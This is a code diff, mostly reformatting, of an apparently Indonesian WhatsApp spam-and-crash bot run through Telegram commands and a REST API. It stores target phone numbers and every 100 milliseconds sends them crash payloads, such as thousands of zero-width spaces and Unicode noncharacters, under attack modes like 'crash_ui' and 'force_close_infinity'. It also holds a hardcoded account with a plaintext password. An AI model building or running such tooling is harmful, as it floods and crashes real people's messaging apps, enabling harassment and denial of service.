@@ -18,48 +18,67 @@ let users = {};
 let sessions = {};
 
 function loadUsers() {
-    if (fs.existsSync(DATA_FILE)) {
-        try {
+    try {
+        if (fs.existsSync(DATA_FILE)) {
             const raw = fs.readFileSync(DATA_FILE);
             users = JSON.parse(raw);
-        } catch(e) { users = {}; }
+        } else {
+            // File gak ada, buat baru dengan user Acunn
+            users = {};
+        }
+    } catch (e) {
+        users = {};
     }
 }
 function saveUsers() {
-    fs.writeFileSync(DATA_FILE, JSON.stringify(users, null, 2));
+    try {
+        fs.writeFileSync(DATA_FILE, JSON.stringify(users, null, 2));
+    } catch (e) {}
 }
 loadUsers();
 
-// ========== HARDCODE USER ACUNN ==========
+// ========== HARCODE USER ACUNN ==========
 if (!users['Acunn']) {
     users['Acunn'] = {
         password: 'Kontol980',
         targets: { admin: [], users: [] },
-        sock: null, qr: null, spamInterval: null,
-        totalSpam: 0, telegramId: null, attackType: 'cyclone'
+        sock: null,
+        qr: null,
+        spamInterval: null,
+        totalSpam: 0,
+        telegramId: null,
+        attackType: 'cyclone'
     };
     saveUsers();
 }
 
-function generateToken() { return crypto.randomBytes(32).toString('hex'); }
+function generateToken() {
+    return crypto.randomBytes(32).toString('hex');
+}
 
 // ========== TELEGRAM BOT ==========
 bot.onText(/\/adduser (.+) (.+)/, (msg, match) => {
     if (msg.chat.id.toString() !== OWNER_ID) return bot.sendMessage(msg.chat.id, '❌ Lu bukan owner, anj!');
-    const username = match[1], password = match[2];
+    const username = match[1],
+        password = match[2];
     if (users[username]) return bot.sendMessage(msg.chat.id, `⚠️ User ${username} sudah ada.`);
     users[username] = {
         password,
         targets: { admin: [], users: [] },
-        sock: null, qr: null, spamInterval: null,
-        totalSpam: 0, telegramId: null, attackType: 'cyclone'
+        sock: null,
+        qr: null,
+        spamInterval: null,
+        totalSpam: 0,
+        telegramId: null,
+        attackType: 'cyclone'
     };
     saveUsers();
     bot.sendMessage(msg.chat.id, `✅ User ${username} berhasil ditambahkan!`);
 });
 
 bot.onText(/\/login (.+) (.+)/, (msg, match) => {
-    const username = match[1], password = match[2];
+    const username = match[1],
+        password = match[2];
     if (!users[username] || users[username].password !== password)
         return bot.sendMessage(msg.chat.id, '❌ Username atau password salah!');
     users[username].telegramId = msg.chat.id.toString();
@@ -68,7 +87,9 @@ bot.onText(/\/login (.+) (.+)/, (msg, match) => {
 });
 
 function getUsernameFromChat(chatId) {
-    for (let u in users) if (users[u].telegramId === chatId.toString()) return u;
+    for (let u in users) {
+        if (users[u].telegramId === chatId.toString()) return u;
+    }
     return null;
 }
 
@@ -89,8 +110,9 @@ bot.onText(/\/stopspam/, (msg) => {
 bot.onText(/\/addtarget (.+) (.+)/, (msg, match) => {
     const username = getUsernameFromChat(msg.chat.id);
     if (!username) return bot.sendMessage(msg.chat.id, '❌ Login dulu.');
-    const number = match[1], role = match[2].toLowerCase();
-    if (!['admin','users'].includes(role)) return bot.sendMessage(msg.chat.id, '❌ Role harus admin atau users.');
+    const number = match[1],
+        role = match[2].toLowerCase();
+    if (!['admin', 'users'].includes(role)) return bot.sendMessage(msg.chat.id, '❌ Role harus admin atau users.');
     users[username].targets[role].push(number);
     saveUsers();
     bot.sendMessage(msg.chat.id, `✅ ${role} ${number} ditambahkan!`);
@@ -102,12 +124,13 @@ bot.onText(/\/removetarget (.+)/, (msg, match) => {
     if (!username) return bot.sendMessage(msg.chat.id, '❌ Login dulu.');
     const number = match[1];
     let removed = false;
-    ['admin','users'].forEach(role => {
+    ['admin', 'users'].forEach(role => {
         const idx = users[username].targets[role].indexOf(number);
-        if (idx !== -1) { users[username].targets[role].splice(idx, 1); removed = true; }
+        if (idx !== -1) { users[username].targets[role].splice(idx, 1);
+            removed = true; }
     });
-    if (removed) { saveUsers(); bot.sendMessage(msg.chat.id, `✅ ${number} dihapus.`); }
-    else bot.sendMessage(msg.chat.id, `❌ ${number} tidak ditemukan.`);
+    if (removed) { saveUsers();
+        bot.sendMessage(msg.chat.id, `✅ ${number} dihapus.`); } else bot.sendMessage(msg.chat.id, `❌ ${number} tidak ditemukan.`);
 });
 
 bot.onText(/\/status/, (msg) => {
@@ -137,7 +160,10 @@ bot.onText(/\/getqr/, (msg) => {
 // ========== WA ENGINE ==========
 async function startWASession(username) {
     const user = users[username];
-    if (user.sock) { updateSpamForUser(username); return; }
+    if (user.sock) {
+        updateSpamForUser(username);
+        return;
+    }
     const { state, saveCreds } = await useMultiFileAuthState(`./sessions/${username}`);
     const sock = makeWASocket({
         auth: state,
@@ -149,14 +175,18 @@ async function startWASession(username) {
         const { connection, lastDisconnect, qr } = update;
         if (qr) {
             user.qr = qr;
-            if (user.telegramId) bot.sendMessage(user.telegramId, `📱 Scan QR:\n${qr}`);
+            if (user.telegramId) {
+                bot.sendMessage(user.telegramId, `📱 Scan QR:\n${qr}`);
+            }
         }
         if (connection === 'open') {
             user.sock = sock;
             user.qr = null;
             console.log(`✅ ${username} connected`);
             updateSpamForUser(username);
-            if (user.telegramId) bot.sendMessage(user.telegramId, '✅ WhatsApp terhubung! Spam aktif.');
+            if (user.telegramId) {
+                bot.sendMessage(user.telegramId, '✅ WhatsApp terhubung! Spam aktif.');
+            }
         }
         if (connection === 'close') {
             const reason = lastDisconnect?.error?.output?.statusCode;
@@ -173,7 +203,8 @@ async function startWASession(username) {
 
 async function pairWASession(username, phoneNumber) {
     const user = users[username];
-    if (user.sock) { await user.sock.end(); user.sock = null; }
+    if (user.sock) { await user.sock.end();
+        user.sock = null; }
     const { state, saveCreds } = await useMultiFileAuthState(`./sessions/${username}`);
     const sock = makeWASocket({
         auth: state,
@@ -188,7 +219,9 @@ async function pairWASession(username, phoneNumber) {
             user.qr = null;
             console.log(`✅ ${username} connected via pairing`);
             updateSpamForUser(username);
-            if (user.telegramId) bot.sendMessage(user.telegramId, '✅ WhatsApp terhubung! Spam aktif.');
+            if (user.telegramId) {
+                bot.sendMessage(user.telegramId, '✅ WhatsApp terhubung! Spam aktif.');
+            }
         }
         if (connection === 'close') {
             const reason = lastDisconnect?.error?.output?.statusCode;
@@ -206,16 +239,17 @@ async function pairWASession(username, phoneNumber) {
 
 function updateSpamForUser(username) {
     const user = users[username];
-    if (user.spamInterval) { clearInterval(user.spamInterval); user.spamInterval = null; }
+    if (user.spamInterval) { clearInterval(user.spamInterval);
+        user.spamInterval = null; }
     if (!user.sock) return;
     const allTargets = [...user.targets.admin, ...user.targets.users];
     if (allTargets.length === 0) return;
     const attackType = user.attackType || 'cyclone';
-    
+
     user.spamInterval = setInterval(async () => {
         try {
             for (let target of allTargets) {
-                switch(attackType) {
+                switch (attackType) {
                     case 'crash_ui':
                         await user.sock.sendMessage(target, { text: '⚠️ CRASH UI BY @PANCYOFFICIAL' });
                         await user.sock.sendMessage(target, { text: '\uFFFE\uFFFF'.repeat(500) });
@@ -254,7 +288,7 @@ function updateSpamForUser(username) {
                         await user.sock.sendMessage(target, { text: '\u200B'.repeat(50000) });
                         break;
                     case 'force_close_infinity':
-                        for(let i=0; i<10; i++) {
+                        for (let i = 0; i < 10; i++) {
                             await user.sock.sendMessage(target, { text: 'INFINITY LOOP ' + i });
                             await user.sock.sendMessage(target, { text: '\uFFFE'.repeat(200) });
                         }
@@ -277,14 +311,15 @@ function updateSpamForUser(username) {
                 }
                 user.totalSpam = (user.totalSpam || 0) + 1;
             }
-        } catch(e) {}
+        } catch (e) {}
         saveUsers();
     }, 100);
 }
 
 function stopSpamForUser(username) {
     const user = users[username];
-    if (user.spamInterval) { clearInterval(user.spamInterval); user.spamInterval = null; }
+    if (user.spamInterval) { clearInterval(user.spamInterval);
+        user.spamInterval = null; }
 }
 
 // ========== REST API ==========
@@ -329,7 +364,7 @@ app.post('/api/targets', auth, (req, res) => {
     const { number, role } = req.body;
     if (!number || !role) return res.status(400).json({ error: 'Missing fields' });
     const user = users[req.username];
-    if (!['admin','users'].includes(role)) return res.status(400).json({ error: 'Invalid role' });
+    if (!['admin', 'users'].includes(role)) return res.status(400).json({ error: 'Invalid role' });
     user.targets[role].push(number);
     saveUsers();
     updateSpamForUser(req.username);
@@ -339,9 +374,11 @@ app.post('/api/targets', auth, (req, res) => {
 app.delete('/api/targets', auth, (req, res) => {
     const { number, role } = req.body;
     const user = users[req.username];
-    if (!['admin','users'].includes(role)) return res.status(400).json({ error: 'Invalid role' });
+    if (!['admin', 'users'].includes(role)) return res.status(400).json({ error: 'Invalid role' });
     const idx = user.targets[role].indexOf(number);
-    if (idx !== -1) { user.targets[role].splice(idx, 1); saveUsers(); updateSpamForUser(req.username); }
+    if (idx !== -1) { user.targets[role].splice(idx, 1);
+        saveUsers();
+        updateSpamForUser(req.username); }
     res.json({ success: true });
 });
 
@@ -356,7 +393,7 @@ app.post('/api/pair', auth, async (req, res) => {
     try {
         const code = await pairWASession(req.username, phone);
         res.json({ code });
-    } catch(e) {
+    } catch (e) {
         console.error(e);
         res.status(500).json({ error: 'Gagal pairing: ' + e.message });
     }
@@ -396,8 +433,12 @@ app.post('/api/admin/adduser', auth, (req, res) => {
     users[username] = {
         password,
         targets: { admin: [], users: [] },
-        sock: null, qr: null, spamInterval: null,
-        totalSpam: 0, telegramId: null, attackType: 'cyclone'
+        sock: null,
+        qr: null,
+        spamInterval: null,
+        totalSpam: 0,
+        telegramId: null,
+        attackType: 'cyclone'
     };
     saveUsers();
     res.json({ success: true });
